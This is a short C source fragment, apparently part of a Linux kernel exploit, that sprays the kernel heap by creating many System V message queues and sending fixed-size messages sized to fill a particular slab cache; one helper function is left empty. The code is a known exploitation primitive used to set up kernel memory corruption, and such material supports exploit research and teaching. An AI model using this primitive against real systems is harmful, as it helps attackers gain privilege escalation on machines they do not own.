#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define spray_size 0x1000 - 0x40 + 64 - 8
int spray_msqid;

int spray_init()
{

}

void spray(int times)
{
  for(int i = 0; i < times; i++)
  {
    spray_msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    struct {
      long mtype;
      char mtext[spray_size];
    } msg;

    memset(msg.mtext, 0, spray_size-1);
    msg.mtype = 1;

    msgsnd(spray_msqid, &msg, sizeof(msg.mtext), 0);
  }
}
